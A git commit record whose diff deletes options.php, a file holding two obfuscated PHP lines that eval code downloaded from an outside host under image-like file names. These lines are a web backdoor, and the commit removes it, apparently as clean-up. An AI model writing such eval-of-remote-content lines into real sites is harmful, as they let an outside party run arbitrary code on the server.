ea942132edf9eff1c34655802ede479524f19784
zwcdemon <99344145+zwcdemon@users.noreply.github.com>
2022-04-26 16:52:06 +0700

    Delete options.php

--- options.php
+++
@@ -1,2 +0,0 @@
-<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/teamm.png"));/**/?>
-<?=/********/ /*******/ /********/@eval/****/("?>".url_get_contents/*******/("https://m.slotao.com/cucok.jpg"));/**/?>
